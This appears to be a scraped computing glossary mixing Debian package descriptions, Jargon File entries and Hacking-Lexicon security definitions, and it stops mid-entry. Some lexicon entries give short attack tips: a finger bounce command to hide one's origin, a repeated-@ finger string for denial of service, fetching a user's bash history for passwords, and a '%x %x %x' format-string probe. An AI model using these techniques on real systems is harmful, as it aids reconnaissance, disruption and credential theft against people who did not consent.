>&#13;eXode database manager The eXode database manager is a structured ASCII-based database library. EXdbm can be used to manage the configuration files of eXode clients. The library uses a tree of hash tables structures stored in memory, favouring speed upon memory consumption. This is not a general purpose database library, its efficiency is based on the fact that the databases managed contain less than a few thousand entries. Note that eXdbm is a general purpose configuration library, it can be used in many other applications without relations to the eXode project.

>&#13;A technique of breaking into a system, or a tool that implements the technique. An exploit takes advantage of a weakness/vulnerability in a system in order to hack it. Culture: Exploits are the key to hacker subculture. Hackers gain fame by discovering exploits. Others gain fame by writing scripts for them. Legions of script-kiddies apply the exploit to millions of systems, defacing webpages and gaining (in)fame. Controversy: There is no good definition for this word. It is debated a lot trying to define exactly what is, and is not, an exploit. Key point: Since people make the same mistakes over-and-over, exploits for very different systems start to look very much like each other. Most exploits can be classified under major categories: buffer overflow, backtracking, defaults, samples, Denial of Service Contrast: The words exploit and vulnerability are often used interchangeably. This is because the person who discovers a new vulnerability will usually write an exploit script for it at the same time. Therefore, the vulnerability is often known by the name of the exploit scriptl. From Hacking-Lexicon

>&#13;An Internet standard for the exchange of files. FTP (uppercase letters) is a specific set of rules that comprise a file transfer protocol. To use FTP, you start an FTP client, an application program that enables youy to contact another computer on the Internet and exchange files with it. To gain access to the toher computer, you normally must supplu a login name and password, after which you are given access to the computer's file directory system, and you can send (upload) and receive (download) files. An exceptin is anonymous FTP, which makes a file arvhive publicly accessible to any Internet use who possesses an FTP clietnl in response to the authentication prompts, you enter anonmous rather than a login name, and as a courtesy supply your electronic mail address as a password. Many web browsers can function as FTP clients to download files from anonymous FTP file archives. From QUECID

>&#13;is a client/server protocol that allows a user to transfer files to and from a remote network site. It works with TCP and is most commonly used on the Internet, although it can also be used on a LAN. An FTP site is a computer that is running FTP server software (also known an FTP daemon, or ftpd). A public ftp site can usually be accessed by anybody by logging in as anonymous or ftp. There are many excellent public ftp sites that make repositories of free Unix software available. By learning how to use FTP, you give yourself access to an indespensible resource. Private FTP sites require a user name or password. If you have a shell account with your ISP, you may be able to access your files via FTP (contact your system administrator to check on this). An FTP client is the userland application that provides access to FTP servers. There are many FTP clients available. Some are graphical, and some are text-based. FTP was first developed by the University of California, Berkeley for inclusion in 4.2BSD (Berkeley Unix).

>&#13;File Locking
</B
></DT
><DD
><P
>&#13;Often, one would like a process to have exclusive access to a file. By this we mean that only one process can access the file at any one time. Consider a mail folder: if two processes were to write to the folder simultaneously, it could become corrupted. We also sometimes want to ensure that a program can never be run twice at the same time; this insurance is another use for ``locking.''  In the case of a mail folder, if the file is being written to, then no other process should try read it or write to it: and we would like to create a write lock on the file. However if the file is being read from, no other process should try to write to it: and we would like to create a read lock on the file. Write locks are sometimes called exclusive locks; read locks are sometimes called shared locks. Often, exclusive locks are preferred for simplicity.  Locking can be implemented by simply creating a temporary file to indicate to other processes to wait before trying some kind of access. UNIX also has some more sophisticated builtin functions.

A file holds data of the same type, for instance, a single picture will be stored in one file. During production, this book had each chapter stored in a file. It is uncommon for different types of data (say, text and pictures) to be stored together in the same file because it is inconvenient.

In a car a firewall is the metal wall separating the engine and passenger compartments. Internet firewalls are intended to keep the flames of Internet hell out of your private LAN. Or, to keep the members of your LAN pure and chaste by denying them access the all the evil Internet temptations. ;-) The first computer firewall was a non-routing Unix host with connections to two different networks. One network card connected to the Internet and the other to the private LAN. To reach the Internet from the private network, you had to logon to the firewall (Unix) server. You then used the resources of the system to access the Internet. For example, you could use X-windows to run Netscape's browser on the firewall system and have the display on your work station. With the browser running on the firewall it has access to both networks. This sort of dual homed system (a system with two network connections) is great if you can TRUST ALL of your users. You can simple setup a Linux system and give an account accounts on it to everyone needing Internet access. With this setup, the only computer on your private network that knows anything about the outside world is the firewall. No one can download to their personal workstations. They must first download a file to the firewall and then download the file from the firewall to their workstation. BIG NOTE: 99% of all break-ins start with gaining account level access on the system being attacked. Because of this I don't recommend this type of firewall. It is also very limiting.

It is often easier to cause a system to fail than to break through it, so security items should probably fail in such a way to result in greater security at the expensive of stopping everything. Confusion: The terms "fail-open" and "fail-close" are frequently used to mean the opposite of each other. Some people think of a door, which when "open" allows things to pass through. Other people think of an electrical circuit, when "open" stops the flow of current (and conversely, a "closed" circuit passes current). Therefore, use the word "fail-safe" instead in order to avoid confusion. Analogy: The electrical circuit-breakers in your home are fail-safe switches using this concept. In the case of an electrical fault causing a short, the circuit breaker will blow open, halting the flow of electricity. This prevents a fire from starting. From Hacking-Lexicon

>&#13;A port of NetHack using SDL Falcon's Eye is a mouse-driven interface for NetHack that enhances the visuals, audio and accessibility of the game, yet retains all the original gameplay and game features. NetHack is a single player dungeon exploration game that runs on a wide variety of computer systems, with a variety of graphical and text interfaces all using the same game engine. Unlike many other Dungeons &#38; Dragons-inspired games, the emphasis in NetHack is on discovering the detail of the dungeon and not simply killing everything in sight - in fact, killing everything in sight is a good way to die quickly. Each game presents a different landscape - the random number generator provides an essentially unlimited number of variations of the dungeon and its denizens to be discovered by the player in one of a number of characters: you can pick your race, your role, and your gender.

The package will automatically convert your existing symlinks into the file method on installation, and convert the file back into symlinks on removal. Both mechanisms are compatible through /etc/init.d/rc, /etc/init.d/rcS, /usr/sbin/update-rc.d, and /usr/sbin/invoke-rc.d scripts. From Debian 3.0r0 APT

>&#13;In UNIX, the finger service provides information about a users. Fingering a user, such as running the command "finger rob@robertgraham.com", will often display the contents of the .plan file. Fingering no specific user, such as finger @robertgraham.com, will list all the users who are logged on. Fingering users is often done during the reconnaissance phase of an attack. Example: The following shows the output of the command "finger rob@rh5.robertgraham.com": Login: rob                              Name: Robert David Graham Directory: /home/rob                    Shell: /bin/bash On since Fri Dec  3 18:13 (PST) on ttyp0 from gemini No mail. No Plan Key point: The finger command reveals extensive information. For example, if I were attacking the above machine, I would notice that the user is running bash Therefore, I may try something like http://rh5.robertgraham.com/ against the user, which in about 1% of the cases will give me a history file of recent commands they've entered, which may contain passwords and such. Key point: There are a number of fun things you can do with finger. The first is that you can use the "finger bounce" technique. Finger servers will often forward requests for you. The command: finger rob@robertgraham.com@example.com will query example.com for rob@robertgraham.com. You can use this technique to hide where your are coming from. On some systems, you can do a DoS attack by sending a finger command like: finger rob@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@robertgraham.com causing the system to go into a loop trying to resolve this. There are also special names you can finger. An empty name will sometimes list the currently logged on users, or sometimes all users with accounts on a machine. The special names of "0", "*", "**" will sometimes have similar effects. From Hacking-Lexicon

>&#13;A common scan hackers perform nowadays is fingerprinting a system in order to figure out what operating system it is running. The two main types of fingerprinting are Queso, which sends weird TCP flags, and nmap, which sends weird TCP options. Narrowing down the operating system is important. For example, attempting Windows-specific hacks against a UNIX system is pointless. Fingerprinting is possible because the TCP/IP specifications do not fully define the behavior of a protocol stack. Therefore, by sending unusual (undefined) network traffic at a system, the hacker will receive responses unique to that system. Key point: One of the key reasons for fingerprinting a system is to search for "old" or "unusual" systems. Non-computer devices like routers, printers, modem banks, etc. are not written to the same level of security standards as real computers. In addition, a hacker may be able to find old SunOS 4 systems which are rife with well-known security flaws. From Hacking-Lexicon

><P
>&#13;A device that isolates a network from the Internet. The word is derived from construction, where "firewalls" isolate areas of a building in order to stop a fire from spreading. A firewall acts as a "choke point". Corporations install firewalls between their internal (private) networks and the (public) Internet. All traffic between the corporation and the Internet flows through the firewall. It acts as a "gate" with virtual guards that examines the traffic, and decided whether to allow it or block it. Misunderstanding: Many people believe that a firewall makes your network immune to hacker penetration. Firewalls have no ability to decide for themselves whether traffic is hostile or benign. Instead, the administrator must program the firewall with rules as to what type of traffic to allow or deny. This is similar to a guard checking badges at a gate: the guard can only detect if the badge is allowed/denied, but cannot detect impersonations or somebody climbing the fence in the back. Key point: Firewalls are based on the principle of blocking everything by default and only allowing those things that are absolutely necessary. Key point: Firewall administrators are frequently at odds with their management. Executives are frequently frustrated by things that don't work in the network. They don't understand how difficult it is to secure each new application, or the increased risks involved. Controversy: A lot of time is wasted on trying to come up with the exact definition of the word "firewall", usually by marketing flaks or nerds with attitude. The term isn't well defined. Most people equate firewalls with packet filters. Others include proxy servers and NATs along with the definition. Misunderstanding: A common question posed is "what is the best firewall?". People who ask the question mean "what stops hackers the best?". This is based upon the same misunderstanding highlighted above: firewalls isolate you from the Internet in the hopes of reducing exposure to hackers. The best firewall that will protect you best from hackers is therefore to completely isolate yourself from the Internet (i.e. don't use the Internet at all). If you want to use the Internet, then you will have some risk due to hackers that firewalls cannot prevent. For example, if you tell the firewall to accept incoming e-mail, then you are suddenly at risk to hacks against e-mail (either viruses, or attempts to force spam through your server). Therefore, the most secure firewall tends to be the cheapest, such as the basic packet filters built into most routers and operating systems. The more expensive firewalls allow you to secure more applications through the firewall, but the more features that you use, the more applications you expose, and ultimately the more risk you undertake. Misunderstanding: Some vendors are selling personal firewalls. This is based upon the misconception highlighted above: firewalls do not block hacker traffic, they are instead a (blunt) tool that allows security administrators to reduce risk. Putting packet filters in the hands of end-users doesn't give them the necessary expertise to secure their systems against hackers. There is also the issue that properly configuring a firewall is actually more difficult than hardening a single machine in the first place. It is only worthwhile because one firewall controls access to hundreds/thousands of machines. Putting a single firewall on a single machine isn't really worth the effort. From Hacking-Lexicon

This is not an abort or deletion as in sense 1, but a demand for early completion! 3. To leave at the end of a day's work (as opposed to leaving for a meal). "I'm going to flush now." "Time to flush." 4. To exclude someone from an activity, or to ignore a person. `Flush' was standard ITS terminology for aborting an output operation; one spoke of the text that would have been printed, but was not, as having been flushed. It is speculated that this term arose from a vivid image of flushing unwanted characters by hosing down the internal output buffer, washing the characters away before they could be printed. The Unix/C usage, on the other hand, was propagated by the fflush(3) call in C's standard I/O library (though it is reported to have been in use among BLISS programmers at DEC and on Honeywell and IBM machines as far back as 1965).

>&#13;In the open-source community, a fork is what occurs when two (or more) versions of a software package's source code are being developed in parallel which once shared a common code base, and these multiple versions of the source code have irreconcilable differences between them. This should not be confused with a development branch, which may later be folded back into the original source code base. Nor should it be confused with what happens when a new distribution of Linux or some other distribution is created, because that largely assembles pieces than can and will be used in other distributions without conflict. Forking is uncommon; in fact, it is so uncommon that individual instances loom large in hacker folklore. Notable in this class were the http://www.xemacs.org/About/XEmacsVsGNUemacs.html, the GCC/EGCS fork (later healed by a merger) and the forks among the FreeBSD, NetBSD, and OpenBSD operating systems.

>&#13;adj.,vi. 1. [common after 1997, esp. in the Linux community] An open-source software project is said to have forked or be forked when the project group fissions into two or more parts pursuing separate lines of development (or, less commonly, when a third party unconnected to the project group ). Forking is considered a Bad Thing - not merely because it implies a lot of wasted effort in the future, but because forks tend to be accompanied by a great deal of strife and acrimony between the successor groups over issues of legitimacy, succession, and design direction. There is serious social pressure against forking. As a result, major forks (such as the Gnu-Emacs/XEmacs split, the fissionings of the 386BSD group into three daughter project, and the short-lived GCC/EGCS split) are rare enough that they are remembered individually in hacker folklore. 2.

>&#13;format-string attacks (printf())
</B
></DT
><DD
><P
>&#13;A common vulnerability created by programmers who use tainted input as the format string for printf() (a common C function). Normally, printf() uses a "format string" to specify how following data will be formatted when printed. For example, when printing the time, you could use the following command: printf("%02d:%02d:%02d", hours, minutes, seconds); This will print the time in a format that looks like "09:15:00" (i.e. quarter after nine). The format string "%02d" means print a decimal number that is 2 digits long, and if the number isn't long enough, put a 0 at the front. Character strings can be printed in a similar manner: printf("greetings=%s", "hello"); This prints the output: greetings=Hello However, if you wanted to be lazy, you could simply program the system: printf("greetings=Hello"); Up to this point, everything is fine. The problem comes about when the string is read from input: g = read_input(); printf(g); The programmer is expecting the user to enter normal input such as "Hi". However, the user could enter something like "die %s". This makes the above statement equivalent to: printf("die %s"); Since there is no following string, this may cause the program to crash. The correct way that this should have been handled is: g = read_input(); printf("%s", g); Printf will treat the first parameter as the format string, but will know not to interpret any formatting characters in subsequent strings. Key point: A popular technique to see if a system is possibly vulnerable to format string bugs is to send the input "%x %x %x". If the hacker sees hex output, then they know the system was vulnerable to format string bugs. From Hacking-Lexicon

>&#13;IPSEC utilities for FreeSWan IPSEC is Internet Protocol SECurity. It uses strong cryptography to provide both authentication and encryption services. Authentication ensures that packets are from the right sender and have not been altered in transit. Encryption prevents unauthorised reading of packet contents. These services allow you to build secure tunnels through untrusted networks. Everything passing through the untrusted net is encrypted by the IPSEC gateway machine and decrypted by the gateway at the other end. The result is Virtual Private Network or VPN. This is a network which is effectively private even though it includes machines at several different sites connected by the insecure Internet. Please note that you will need kernel support for using this package. The standard Debian kernel does not include support for FreeSWan.

Compared to the 2.2.x stock ftape driver the difference is reduced to support for the Iomega Ditto Max, parallel port floppy tapes (Colorado Trakker, Iomega, Exabyte and Seagate parallel port drives) and multiple tape drives in one box. Supported drives according to upstream README: "Currently, the driver supports many QIC-40/QIC-80/QIC-3010/QIC-3020 tape drives that conform to the respective QIC-* development standards, as well as the Iomega Ditto 2GB and Max drives. Some parallel port tape drives are also supported, too. These are the Colorado Trakker and several kinds of parallel port drives that use the Micro Solutions' "Backpack" protocol, i.e. the Iomega Ditto parallel port drives, and some parallel port floppy tape drives made by Exabyte and Seagate."

However ftpgrab is oriented towards the smaller site which doesn't have the resources to mirror entire version trees of software. The primary "plus point" of ftpgrab is that it can base download decisions by parsing version numbers out of filenames. For example, ftpgrab will recognize that the file "linux-2.2.2.tar.gz" is newer than "linux-2.2.1.tar.gz" based on the version string. It will then download the new version and delete the old one when it is done, thus saving you mirroring 10 kernel versions all at &#62;10Mb each. From Debian 3.0r0 APT

>&#13;There are many ways to describe a Geographic Information System. Here are three working definitions (from David A. Hastings, 1992, Geographic Information Systems: A Tool for Geoscience Analysis and Interpretation): (The minimal definition): A GIS is a hardware/software system for the storage, management, and (with hardcopy or screen graphic) selective retrieval capabilities of georeferenced data. Definitions like this one are often used by vendors and users of vector-only GIS, whose objective is sophisticated management and output of cartographic data. (A parallel definition): A GIS is a hardware/software system for managing and displaying spatial data. It is similar to a traditional Data Base Management System, where we now think in spatial rather than in tabular terms, and where the "report writer" now allows output of maps as well as of tables and numbers. Thus we can consider a GIS a "spatial DBMS" as opposed to traditional "tabular DBMSs." Few people use this definition, but it might help to explain GIS to a DBMS user. (A more aggressive definition): A GIS is a system of hardware, software, and data that facilitates the development, enhancement, modeling, and display of multivariate (e.g. multilayered) spatially referenced data. It performs some analytical functions itself, and by its analysis, selective retrieval and display capabilities, helps the user to further analyze and interpret the data. Properly configured, the GIS can model (e.g. synthetically recreate) a feature or phenomenon as a function of other features or phenomena which may be related - where all features or phenomena are represented (characterized) by spatial and related tabular data. The analytical objectives described here are sometimes controversial - and often given lip service by cartographic GIS specialists who have not yet seen what can be accomplished scientifically by a select few GISs that go beyond cartographic approaches. Another definition can be found at the University of Edinburgh. From GRASS mini-HOWTO

>&#13;is a public domain raster based GIS, vector GIS, image processing system, and graphics production system. Created by the US Army Corps of Engineers, Constriction Engineering Research Laboratory (USA/CERL) and enhanced by many others, it is used extensively at government offices, universities and commercial organizations throughout the world. It is written mostly in C for various UNIX based machines. Linux is one of its more robust implementations. GRASS contains over 40 programs to render images on monitor and paper; over 60 raster manipulation programs; over 30 vector manipulation programs; nearly 30 multi-spectral image processing manipulation programs; 16 data management programs; and 6 point file management programs. GRASS' strengths lie in several fields. The simple user interface makes it an ideal platform for those learning about GIS for the first time. Users wishing to write their own code can do so by examining existing source code, interfacing with the documented GIS libraries, and by using the GRASS Programmers' Manual. This allows more sophisticated functionality to be fully integrated within GRASS. Other strengths include GRASS' pioneering of mixed resolutions in a data base, mixed geographic coverage areas in a data base, raster image compression techniques via run-length encoding and reclassification lookup tables, GRASS' rescaling of display images on the fly to fill the display screen, plus its fundamental design criterion of powerful computer-assisted scientific analysis of environmental issues (as opposed to merely going for intricate cartographic output of relatively simple processes). GRASS is usually supplied as free, non-copyright source code to be compiled on host machines. Some compiled binaries are also easily obtainable at no cost via the Internet. It runs on a variety of UNIX platforms. Copied from Project Assist Intro to GRASS. From GRASS HOWTO

>&#13;Gopher is an almost irrelevant protocol today, but it was very popular in the early 1990s. Gopher is simply a hierarchical menu of hyperlinks. This means that like HTTP/HTML, you can build virtual sites containing documents from other sites. However, unlike HTTP/HTML, the only structure is that of a hierarchical menu: it doesn't support hyperlinking within the documents that it points to. Key point: There are still a lot of Gopher servers out there, However, since they are no longer mainstream, they are rarely maintained by security people. Therefore, they often present a way to compromise the network. From Hacking-Lexicon

Gopher was originally developed at the University of Minessota and nameeed after the school mascot. Unlike FTP and Archie, Gopher doesn't require you to know and use details of host, directory, and file names, Instead, you browse though menus and press Enter when you find something interseting. You usually see another menu, with more options, until finally you seect an option that displays information. You can then read the infromation or save it to your disk storage area after retreiving it with anonymous FTP.

Although Gopher spread rapidly across the globe in only a couple of years, it has been largely supplanted by Hypertext, also known as WWW (World Wide Web).

As time goes on, more gems appear at the very top of the screen, pushing the rest downwards.  The game is over when the gems reach the bottom. It's your job to keep the screen from filling up.  You do this by "grabbing" gems from the top of the screen, carrying them around, if need be, and "throwing" them back up. If, when you throw some gems back up, you create a "match" of 3 or more gems in a vertical column, they disappear (with a cool little explosion). At this point, if there are any "matches" of the same gem to the left or right of this column, they disappear too!  And so on.  This is great for cool chain-reactions! You also get more points for the more gems that disappear in a match.  (Matching four gives as many points as matching three twice, for example.) From Debian 3.0r0 APT

This character or string can be antialiased (smoothed). The string can also consider the kerning pairs if available in the AFM or TTF file. The displayed character or string can be saved in GIF format. A table with all glyphs in the font (for PostScript Type 1 fonts also in several encodings) can also be created. A custom encoding will be generated on the fly to allow you to see all characters (also not encoded ones) in a Type 1 font, the so called "Custom" encodings. You can also print a sample of a font. The program generates PostScript code with sample strings in several sizes, which you can download to any PostScript printer or to ghostscript. TrueType fonts can be saved as Type42 PostScript fonts.

>&#13;Programmer's editor with multiple windows and syntax highlighting Glimmer is a simple code editor for use with just about any programming language, which makes use of of the Gtk+ widget set and the GNOME libraries, which includes drag and drop support. It includes syntax and bracket highlighting, the ability to build from within the editor, and support for saving sessions of many different code files open at once. Most settings can be customised from within the editor. Glimmer includes support for the following languages: Ada, bash/sh, C, C++, FORTRAN, HTML, Java, Javascript, Latex, GNU Make, Perl, PHP, Python, Lisp (guile, scheme, etc), SGML, SQL, Tcl/Tk, XML, XHTML, and Z80 Assembly, to name a few. Glimmer is also very extensible in the languages it supports for its syntax highlighting. If support for your language of choice is not included, you can write it very easily. In addition to this, Glimmer is completely scriptable with python. See http://glimmer.sourceforge.net for more information. From Debian 3.0r0 APT

>&#13;/glob/, not /glohb/ v.,n. [Unix; common] To expand special characters in a wildcarded name, or the act of so doing (the action is also called `globbing'). The Unix conventions for filename wildcarding have become sufficiently pervasive that many hackers use some of them in written English, especially in email or news on technical topics. Those commonly encountered include the following: * wildcard for any string (see also UN*X) ? wildcard for any single character (generally read this way only at the beginning or in the middle of a word) [] delimits a wildcard matching any of the enclosed characters {} alternation of comma-separated alternatives; thus, `foo{baz,qux}' would be read as `foobaz' or `fooqux' Some examples: "He said his name was [KC]arl" (expresses ambiguity). "I don't read talk.politics.*" (any of the talk.politics subgroups on Usenet). Other examples are given under the entry for X. Note that glob patterns are similar, but not identical, to those used in regexps. Historical note: The jargon usage derives from glob, the name of a subprogram that expanded wildcards in archaic pre-Bourne versions of the Unix shell.  From Jargon Dictionary

GLUT is designed for constructing small to medium sized OpenGL programs. While GLUT is well-suited to learning OpenGL and developing simple OpenGL applications, GLUT is not a full-featured toolkit so large applications requiring sophisticated user interfaces are better off using native window system toolkits like Motif.

As the README puts it: Ever get the feeling that nothing is going right?  You're a sysadmin, and someone's trying to destroy your computers.  The little people running around the screen are trying to infect your computers with Wingdows [TM], a virus cleverly designed to resemble a popular operating system. Your objective is to click the mouse on them, ending their potential threat.  If one of the people reaches a computer, it will attempt to replace your operating system with the virus it carries. It will then attempt to run off the screen with your vital software.  The game ends when only 0 or 1 of your computers is being productive.  Additionally, some computers are connected with network cables. When one computer on a network becomes infected, a spark will be sent down the cable, and will infect the computer on the other end when it reaches there. From Debian 3.0r0 APT

Gnotepad+ was designed to have as little bloat as possible, while still providing many of the common features found in a modern GUI-based text editor.  It is still fairly light-weight, especially for the features it offers, and aims to remain that way. The "+" in gnotepad+ is there to differentiate it from other GNOME-based text editors which may call themselves "gnotepad". Additionally, gnotepad+ is not intended to be fancy, so it leverages its text editing capabilities on the GTK Text Widget.  Hence, if you are looking for a programmer's editor, look for another text editor or help improve the GTK Text Widget. From Debian 3.0r0 APT

>&#13;A versatile News and mailing list reader for Emacsen Gnus is a message-reading laboratory.  This is by far the most powerful and extensible news reader that I am aware of. It will let you look at just  about anything as if it were a newsgroup.  You can read mail with it,  you can browse directories with it, you can ftp with it---you can even read news with it! It handles single file groups, MH format folders, mbox files, digests, knows about POP, etc. It can split incoming mail ala procmail. This version of gnus handles MIME natively. It adds offline reading capability with gnus-agent. It is not compatible with older versions of TM (since a large number of hooks and variables have changed to allow that). NOTE: Please do not use tm-gnus with  this version. Instead of boring old KILL files, it has an adaptive multifaceted scoring mechanism -- you add or reduce the score of the article based on rules, and a component of the score comes in from your past behaviour -- for example, articles similar to ones you read and saved get higher scores. This adaptive mechanism is one of the most interesting part of Gnus. Gnus tries to empower people who read news the same way Emacs empowers people who edit text.  Gnus sets no limits to what the user should be allowed to do.  Users are encouraged to extend Gnus to make it behave like they want it to behave.  A program should not control people; people should be empowered to do what they want by using (or abusing) the program. Gnus comes by default with XEmacs, but this is a stand alone package that replaces the stock Gnusii. A note for people  using the nnimap backend: SSL support requires w3-el-e20; and even otherwise w3-el makes following hyperlinks in mail and news easier.

OSS comes with the Linux kernel as free software called OSS/Free, and is available for a number of other platforms. Apart from the exhaustive command line interface described here, gom optionally has two built-in interactive interfaces (that I call gomiis, gom interactive interfaces;): a terminal gomii using ncurses, and a X gomii using the xview toolkit.

>&#13;n. A type of Internet service first floated around 1991 and obsolesced around 1995 by the World Wide Web. Gopher presents a menuing interface to a tree or graph of links; the links can be to documents, runnable programs, or other gopher menus arbitrarily far across the net. Some claim that the gopher software, which was originally developed at the University of Minnesota, was named after the Minnesota Gophers (a sports team). Others claim the word derives from American slang `gofer' (from "go for", dialectal "go fer"), one whose job is to run and fetch things. Finally, observe that gophers dig long tunnels, and the idea of tunneling through the net to find information was a defining metaphor for the developers. Probably all three things were true, but with the first two coming first and the gopher-tunnel metaphor serendipitously adding flavor and impetus to the project as it developed out of its concept stage.

Supported (guessable) filesystem or partition types:  * BeOS filesystem type.  * FreeBSD/NetBSD/386BSD disklabel sub-partitioning    scheme used on Intel platforms.  * Linux second extended filesystem.  * MS-DOS FAT12/16/32 "filesystems".  * IBM OS/2 High Performance filesystem.  * Linux LVM physical volumes (LVM by Heinz Mauelshagen).  * Linux swap partitions (versions 0 and 1).  * The Minix operating system filesystem type.  * MS Windows NT/2000 filesystem.  * QNX 4.x filesystem.  * The Reiser filesystem (version 3.5.X, X &#62; 11).  * Sun Solaris on Intel platforms uses a sub-partitioning    scheme on PC hard disks similar to the BSD disklabels.  * Silicon Graphics' journalling filesystem for Linux.

Real time simulation speeds of 20Mhz PICs are possible. Gpsim has been designed to be as useful as possible. The standard simulation paradigm including breakpoints, single stepping, disassembling, memory inspect &#38; change, have been implemented. In addition, gpsim supports many debugging features that are only available with in-circuit emulators. For example, a continuous trace buffer tracks every action of the simulator.

Because sound files in .WAV-format are used, it is possible to exchange the files with many other programs. Cdrecord(1) can burn CD-Recordables of these, so you can make CDs with the music of your favorite records.  The user interface of GramoFile has a windows-like look-and-feel, making it fairly easy to use. One of the most important parts of GramoFile is the ability to process digital audio signals. Through the application of several filters it is possible to accomplish a significant reduction of disturbances like ticks and scratches. These filters have been programmed in such a fashion that they can be applied in any order (and multiple times) in a single run, thus avoiding the use of temporary files. It is possible to adjust the properties of each filter independently, so in every situation an optimal result can be achieved. Another interesting feature is the track splitting. Just make one .wav file of an entire side of an record and GramoFile will detect where the individual tracks are located. This happens fully automatically, without need to set any options. More experienced users may fine-tune the algorithm, or change the detected track starts and ends, but generally that will not be necessary. Track-times are saved in an editable (plaintext) .tracks file, that will be used during the signal processing to produce one processed .wav file for each individual track. To record and play .wav files, modified versions of brec(1) and bplay(1) by David Monro are included. These programs provide buffered recording and playback, so all will go well even on a highly loaded system. Both programs have been modified to support the standard GramoFile user interface.  Brec also got a `graphical' peak level meter, and bplay a running time display. From Debian 3.0r0 APT

The upstream default is simply to write a *.au file to a sound device file by using cat(1). Since cat is not a good sound player, the default is changed to use sox instead.  grandfatherclock depends on sox to ensure that it can run under the default configuration.

>&#13;To continually guess passwords to find the correct one. Analogy: If someone steals your bank card, they cannot sit in front of the cash machine and guess all possible PIN numbers. After a certain number of unsuccessful tries, the bank machine will "eat" the card. Key point: Secure systems (UNIX, Windows NT) lock out accounts after a certain number of unsuccessful tries. These lock-outs can either be temporary (and restore themselves automatically), or permanent until an administrator intervene and unlocks the account. Key point: Non-secure systems (Win9x and many software applications) do not lock out accounts. For example, if you have Win9x "File and Print Sharing" turned on and protected with a password, a hacker can try continuously and invisibly to gain access to your machine. Nothing is logged, nothing is locked out. Contrast: When brute-force cracking, the hacker does all the calculations himself (comparing them against the stolen encrypted password file). When doing a grind, the hacker must enter the passwords one by one, and the target system does the calculations to see if they are valid. An intrusion detection system can detect grinds, but not cracks. From Hacking-Lexicon

GNOME SmsSend will detect each provider's respective script file from SmsSend's preference directory or its global defaults and create a tab in its user interface for each one. GNOME SmsSend will then fork or execute smssend with the proper options to send the SMS message you input into it. It also provides a link to SmsSend's homepage where you can download the required script (if available) for your GSM provider if it is not already provided with the SmsSend package.

HTML is the markup language behind the appearance of documents on the WWW (World Wide Web), and the parser programs for accessing thes documents are called Webbrowsers. A subset of the SGML (Standard Generalised Markup Language), HTML includes capabilities that enable authors to insert hyperlinks, which when clicked display another HTML document. The process of composing HTML text is called authoring. You can author HTML text by editing a plain-text document with a stand alone HTML editor, such as HTML assistant. In adddition, add-on programs are available that provide HTML editing capaibilities such as Bluefish. Unlike a word processing program's formatting codes, HTML codes - called tags - do not specify just how the tagged text is a certain portion of a document, such as a title, heading, or body text. The parser decides how to format the text. From QUECID

</B
></DT

><P
>&#13;UNIX allows the data of a file to have more than one name in separate places in the same file system. Such a file with more than one name for the same data is called a hard-linked file and is similar to a symbolic link. Try touch mydata; ln mydata mydataB; ls -al. The files mydata and mydataB are indistinguishable. They share the same data, and have a 2 in second column of the ls -al listing. This means that they are hard-linked twice (that there are two names for this file).  The reason why hard links are sometimes used in preference to symbolic links is that some programs are not fooled by a symbolic link: If you have, say, a script that uses cp to copy a file, it will copy the symbolic link instead of the file it points to. [ cp actually has an option to override this behavior.] A hard link, however, will always be seen as a real file. On the other hand, hard links cannot be made between files on different file systems nor can they be made between directories. From Rute-Users-Guide

More generally, "I hack `foo'" is roughly equivalent to "`foo' is my major interest (or project)". "I hack solid-state physics." See Hacking X for Y. 5. vt. To pull a prank on.

A person who is good at programming quickly. 5. An expert at a particular program, or one who frequently does work using it or on it; as in `a Unix hacker'. (Definitions 1 through 5 are correlated, and people who fit them congregate.) 6. An expert or enthusiast of any kind. One might be an astronomy hacker, for example. 7. One who enjoys the intellectual challenge of creatively overcoming or circumventing limitations. 8. [deprecated] A malicious meddler who tries to discover sensitive information by poking around. Hence `password hacker', `network hacker'. The correct term for this sense is cracker. The term `hacker' also tends to connote membership in the global community defined by the net (see the network and Internet address). For discussion of some of the basics of this culture, see the How To Become A Hacker FAQ. It also implies that the person described is seen to subscribe to some version of the hacker ethic (see hacker ethic). It is better to be described as a hacker by others than to describe oneself that way. Hackers consider themselves something of an elite (a meritocracy based on ability), though one to which new members are gladly welcome. There is thus a certain ego satisfaction to be had in identifying yourself as a hacker (but if you claim to be one and are not, you'll quickly be labeled bogus). See also wannabee. This term seems to have been first adopted as a badge in the 1960s by the hacker culture surrounding TMRC and the MIT AI Lab.

>&#13;hacker (hacking)
</B
></DT
><DD
><P
>&#13;A hacker is someone who is able to manipulate the inner workings of computers, information, and technology. Consider Arthur C. Clark's Third Law: "Any sufficiently advanced technology is indistinguishable from magic". Since normal people have no clue as to how computers work, they often view hackers with suspicion and awe (as magicians, sorcerers, witches, and warlocks). This suspicion leads to the word "hacker" having the connotation of someone up to no good. History: The word "hacker" started out in the 14th century to mean somebody who was inexperienced or unskilled at a particular activity (such as a golf hacker). In the 1970s, the word "hacker" was used by computer enthusiasts to refer to themselves. This reflected the way enthusiasts approach computers: they eschew formal education and play around with the computer until they can get it to work. (In much the same way, a golf hacker keeps hacking at the golf ball until they get it in the hole). Furthermore, as "experts" learn about the technology, the more they realize how much they don't know (especially about the implications of technology). When experts refer to themselves as "hackers", they are making a Socratic statement that they truly know nothing. For more information on this connotation, see ESR's computer enthusiast "Jargon File". Key point: Today if you do a quick search of "hacker" in a search engine, you will still occasional uses of the word in senses used in the 1400s and 1970s, but the overwhelming usage in the 1990s describes people who break into computers using their sorcerous ways. Likewise, the vast majority of websites with the word "hack" in their title refer to illegitimate entry into computer systems, with notable exceptions like http://www.hacker.com/ (for golf). Controversy: The computer-enthusiast community does not like using "hacker" to describe malicious people; they prefer "cracker". The security-community restricts the use of the word "cracker" to some who breaks encryption and copy-protection schemes. Consequently, a journalist who writes about cybercriminals cannot use either word without hate mail from the opposing community claiming they are using the word incorrectly. If a journalists writes about hackers breaking into computers, they will receive hate-mail claiming that not all hackers are malicious, and the that the correct word is "cracker". Likewise, if they write about crackers breaking into computers, they will receive hate-mail claiming that crackers only break codes, but its hackers who break into systems. The best choice probably depends upon the audience; for example one should definitely talk about malicious crackers in a computer-enthusiast magazine like Linux Today. From Hacking-Lexicon

>&#13;hacker ethic
</B
></DT
><DD
><P
